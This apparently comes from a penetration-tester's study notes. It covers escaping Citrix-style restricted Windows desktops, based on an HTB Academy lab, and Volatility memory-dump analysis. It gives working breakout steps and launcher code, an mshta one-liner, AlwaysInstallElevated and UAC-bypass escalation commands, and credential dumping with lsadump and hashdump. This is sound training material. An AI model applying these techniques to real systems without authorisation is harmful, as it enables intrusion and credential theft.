### 23.2 Bypassing Path Restrictions via File Dialogs

Group Policy may block normal navigation to paths such as `C:\Users` or `C:\Windows\System32` in File Explorer. Many applications still expose **Open**, **Save As**, **Browse**, **Import/Export**, or **Print** dialogs.

**HTB example using Paint:**

1. Open **Paint** from the Start menu.
2. Select **File → Open**.
3. Set the file type to **All Files**.
4. In **File name**, enter a UNC path to the local machine:

```text
\\127.0.0.1\c$\users\pmorgan
```

5. Press **Enter** to attempt to browse the target location.

**Why it can work:** The application dialog may not apply the same Explorer navigation restriction. The `c$` component references Windows' administrative C-drive share; access still depends on SMB/share permissions and the environment's configuration.

**Other dialog entry points:** Notepad, WordPad, Paint, and any application exposing file-selection dialogs.

### 23.3 Accessing an SMB Share from a Restricted Desktop

A file dialog may also be able to browse a remote SMB share when normal File Explorer navigation is blocked.

On the **Linux assessment host**, serve the current working directory using Impacket:

```bash
smbserver.py -smb2support share "$(pwd)"
```

In the restricted desktop, open **Paint → File → Open**, change the filter to **All Files**, and supply the lab's SMB UNC path:

```text
\\10.13.38.95\share
```

The HTB example shows a remotely hosted executable being opened from the dialog, providing a command prompt. Direct file copying in the standard Explorer interface remained restricted; once a shell was available, command-line file transfer could be used.

**Example launcher source (`pwn.c`) from the module:**

```c
#include <stdlib.h>

int main(void) {
    system("C:\\Windows\\System32\\cmd.exe");
}
```

**Notes:**

- The SMB address is **lab-specific**; replace it with the assessment host's address.
- The module uses a precompiled `pwn.exe` corresponding to this source.
- Access to the SMB share and whether executable launch is permitted both depend on the target's policies.

### 23.4 Alternative File Managers

If the Windows Explorer interface enforces navigation/copying restrictions, another file manager may behave differently.

| Tool | Relevance |
|---|---|
| **Explorer++** | Portable file manager; the module demonstrates copying files from an SMB share to the user's Desktop. |
| **Q-Dir** | Alternative file manager to test against Explorer-specific restrictions. |

**Procedure:** Open a file dialog, navigate to the SMB share, launch an allowed portable file manager, and test whether it can browse or copy the files blocked in standard Explorer.

> An alternative file manager does not inherently bypass NTFS ACLs or application allowlisting; the example is about restrictions on the standard Explorer interface.

### 23.5 Alternative Registry Editors

If **Registry Editor (`regedit.exe`)** is blocked by policy, third-party editors may offer an alternate GUI route to view or edit registry settings.

Examples from the HTB module:

- **SimpleRegEdit**
- **UberRegEdit**
- **SmallRegistryEditor**

**Assessment point:** Determine whether blocking only `regedit.exe` adequately prevents registry changes. Actual registry permissions and application-control policy remain relevant.

### 23.6 Modifying Windows Shortcuts (`.lnk`)

An existing Windows shortcut can sometimes be repurposed to launch a restricted executable.

1. Right-click an existing shortcut and select **Properties**.
2. Change its **Target** to:

```text
C:\Windows\System32\cmd.exe
```

3. Execute the shortcut and check whether the command prompt opens.

If an editable shortcut is not available, the module notes that one could be transferred using SMB or created separately.

**Key point:** A shortcut can serve as an indirect executable-launch mechanism where ordinary navigation or Start Menu access is blocked.

### 23.7 Script Execution

Script file associations may enable a restricted user to invoke an interpreter through a file rather than through the Start Menu.

The module's minimal batch-file example:

**`evil.bat`**

```bat
cmd
```

Save and run the file to test whether the batch-file association starts Command Prompt.

**Extensions mentioned by HTB:**

- `.bat` — Windows batch scripts
- `.vbs` — VBScript
- `.ps` — as named in the source (PowerShell script files normally use `.ps1`)

**Assessment point:** Check whether interpreters are actually controlled through execution policies and application allowlisting, rather than relying only on hidden shortcuts and blocked Explorer paths.

### 23.8 Local Privilege Escalation: AlwaysInstallElevated

After obtaining a shell, the module uses **PowerUp** (or suggests **winPEAS**) to identify Windows privilege-escalation weaknesses.

The lab exposes an insecure Windows Installer policy: **AlwaysInstallElevated** is enabled under **both** the current-user and local-machine policy keys.

Check both values:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Vulnerable configuration shown in the module:**

```text
AlwaysInstallElevated    REG_DWORD    0x1
```

Both keys being set to `1` means Windows Installer packages may run with elevated permissions, creating a local privilege-escalation risk.

**HTB PowerUp workflow:**

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

This produces `UserAdd.msi`. In the lab, launching the installer allows creation of a local account in the **Administrators** group (the source demonstrates this with a lab-only example account).

A command prompt can then be started under that account:

```cmd
runas /user:<new-local-user> cmd
```

> **Important:** Membership of the local Administrators group does not guarantee that every launched process has an elevated token. `runas` changes the account context; it is not, by itself, a UAC elevation mechanism.

### 23.9 User Account Control (UAC)

In the HTB scenario, a newly created local administrator still receives **Access is denied** when trying to enter `C:\Users\Administrator` from a non-elevated session.

**Reason:** UAC can run processes belonging to administrators with a **filtered**, non-elevated access token. Some operations still require elevated privileges.

The module demonstrates a PowerShell UAC-bypass module and a method named `UacMethodSysprep`:

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

The walkthrough reports that the technique launches a higher-privileged PowerShell session. This is a **lab-specific demonstration**, not a guarantee that the method works on supported or hardened Windows versions.

**Verify the actual token and privileges:**

```cmd
whoami /all
whoami /priv
```

Confirm elevated group/token information and whether previously denied operations are now authorised.

### 23.10 Quick Reference

| Objective | Technique / Command |
|---|---|
| Reach a blocked path | Paint → File → Open → **All Files** → `\\127.0.0.1\c$\users\pmorgan` |
| Host a lab SMB share | `smbserver.py -smb2support share "$(pwd)"` |
| Browse remote SMB from dialog | `\\10.13.38.95\share` |
| Launch a shell through a shortcut | Set `.lnk` Target to `C:\Windows\System32\cmd.exe` |
| Test batch-file execution | `.bat` file containing `cmd` |
| Use a different file browser | Explorer++ / Q-Dir |
| Check installer policy (user) | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| Check installer policy (machine) | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
| Generate lab MSI with PowerUp | `Import-Module .\PowerUp.ps1` then `Write-UserAddMSI` |
| Launch as another local user | `runas /user:<user> cmd` |
| Inspect privileges | `whoami /all` and `whoami /priv` |

### 23.11 Key Takeaways / Exam Reminders

- **The core breakout chain:** dialog box → path/share access → command execution → local enumeration → privilege escalation.
- **File dialogs are a common weak point** in desktops that restrict only Windows Explorer.
- **UNC paths** may access local administrative shares or remote SMB shares from dialogs.
- **Explorer++ and Q-Dir** can help distinguish Explorer-specific navigation restrictions from actual file permissions.
- **Registry-editor alternatives, shortcut targets, and script associations** are additional execution or management paths to consider.
- **AlwaysInstallElevated requires both HKCU and HKLM** values to be configured to create the described MSI elevation exposure.
- **Administrator-group membership ≠ elevated process token.** Verify privileges and UAC state rather than assuming elevation succeeded.
- Treat paths, addresses, accounts, and legacy UAC techniques in the HTB example as **lab-specific**, and only run breakout/elevation tests within authorised scope.

**Source:** HTB Academy, *Citrix Breakout*, Module 67, Section 2502.

### 23.12 Exam Quick Wins (No Shell Yet)

**Identify the current username**

| Method | How |
|---|---|
| File dialog env vars | In any Open/Save dialog type `%USERPROFILE%` in **File name** → Enter. The address bar shows `C:\Users\<username>` |
| Default save location | **Save As** in Notepad/Paint usually opens `C:\Users\<username>\Documents` |
| Task Manager | `Ctrl+Shift+Esc` → **Users** tab, or **Details** tab → *User name* column |
| Start menu | Account tile / profile picture shows the user |
| Security screen | `Ctrl+Alt+Del` (`Ctrl+Alt+End` inside RDP) |
| Once you have a shell | `whoami`, `echo %USERNAME%`, `$env:USERNAME` |

**Read a file in a blocked folder**

1. Notepad / WordPad → **File → Open** → set filter to **All Files**.
2. Type the full path straight into **File name**: `C:\Restricted\department.txt` → Enter. This often works even when browsing to the folder is blocked.
3. If that fails, try UNC: `\\127.0.0.1\c$\Restricted\department.txt`, or `\\localhost\c$\...`.
4. A browser can read it too: `file:///C:/Restricted/department.txt`.
5. Drag the file from a dialog onto an open Notepad window.

**Get command execution**

| Route | How |
|---|---|
| Run dialog | `Win+R` → `cmd` / `powershell` |
| Task Manager | `Ctrl+Shift+Esc` → **File → Run new task** → `cmd` (tick *Create with administrative privileges* if offered) |
| File dialog | Browse to `C:\Windows\System32`, right-click `cmd.exe` → **Open**. Or type `cmd.exe` in the dialog's address bar |
| Help / links | Any **Help** or hyperlink opens a browser → `file:///C:/Windows/System32/` → run `cmd.exe` |
| Shortcut / batch | See 23.6 and 23.7 |
| Shell folders | Address bar: `shell:System`, `shell:Startup`, `shell:AppData` |
| Alternative binaries | `C:\Windows\SysWOW64\cmd.exe`, `powershell_ise.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Path-based block | Copy `cmd.exe` to the Desktop / Documents and rename it (beats path rules, not hash rules) |
| mshta | `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd"":close")` |

If cmd shows *"The command prompt has been disabled by your administrator"*, the `DisableCMD` policy is on — `.bat` files are blocked too, so go straight to PowerShell / PowerShell ISE.

**Identify the hostname**

```cmd
hostname
echo %COMPUTERNAME%
```

```powershell
$env:COMPUTERNAME
```

No shell: `Win+Pause`, **Settings → System → About**, `sysdm.cpl`, `msinfo32`, or `whoami` output (`HOST\user` for local accounts).

**Find the trophy once you have a shell**

```cmd
type C:\ProgramData\Operations\trophy.txt
dir C:\ /s /b /a 2>nul | findstr /i trophy
```

Note: `C:\ProgramData` is hidden — in dialogs type the path directly rather than browsing for it.

# 24. Windows Memory & Crash Dump Analysis

## Volatility

Set variables (adjust paths/profile after `imageinfo`):

```bash
VOL=./volatility_2.6_lin64_standalone
DUMP=memory.dmp
PROFILE=Win2012R2x64
```

### Identify dump and profile

```bash
file "$DUMP"                            # Identify file type
$VOL -f "$DUMP" imageinfo              # Suggested Windows profiles
$VOL -f "$DUMP" kdbgscan               # Check kernel debugger structures
$VOL --info | grep -E 'lsadump|hashdump|pslist'
```

> `imageinfo` profiles are suggestions. Select the correct one before running other plugins.

### Core analysis

```bash
$VOL -f "$DUMP" --profile=$PROFILE crashinfo  # Crash dump information
$VOL -f "$DUMP" --profile=$PROFILE pslist     # Active processes
$VOL -f "$DUMP" --profile=$PROFILE pstree     # Parent/child processes
$VOL -f "$DUMP" --profile=$PROFILE psscan     # Scan for process objects
$VOL -f "$DUMP" --profile=$PROFILE cmdline    # Process command lines
$VOL -f "$DUMP" --profile=$PROFILE consoles   # Console command history
$VOL -f "$DUMP" --profile=$PROFILE netscan    # Network endpoints (supported Windows versions)
$VOL -f "$DUMP" --profile=$PROFILE filescan   # File objects in memory
```

### Registry and credentials

```bash
$VOL -f "$DUMP" --profile=$PROFILE hivelist  # Registry hive locations
$VOL -f "$DUMP" --profile=$PROFILE printkey -K 'Software\Microsoft\Windows\CurrentVersion\Run'
$VOL -f "$DUMP" --profile=$PROFILE lsadump   # LSA secrets, e.g. DefaultPassword
$VOL -f "$DUMP" --profile=$PROFILE hashdump  # Local account NTLM hashes
$VOL -f "$DUMP" --profile=$PROFILE cachedump # Cached domain credentials
```

**Output tips:** `DefaultPassword` may be UTF-16LE (`44 00 6f 00` → `Do`). `DPAPI_SYSTEM` is key material, **not** a plaintext login password.

### Export artifacts

```bash
mkdir -p output
$VOL -f "$DUMP" --profile=$PROFILE procdump -p <PID> -D output/
$VOL -f "$DUMP" --profile=$PROFILE memdump  -p <PID> -D output/
$VOL -f "$DUMP" --profile=$PROFILE dumpregistry -D output/
```

### Common errors

| Symptom | Fix |
|---|---|
| `Please specify a location (-l) or filename (-f)` | Add `-f "$DUMP"` |
| Wrong/empty plugin output | Recheck `imageinfo`, profile and dump completeness |
| `WindowsCrashDumpSpace64 ... extremely slow` | Performance warning; operation may still succeed |
| `netscan` unsupported | Check plugin support for the Windows profile |

**Reminder:** Not every `.dmp` contains full RAM; available artifacts depend on the dump type.

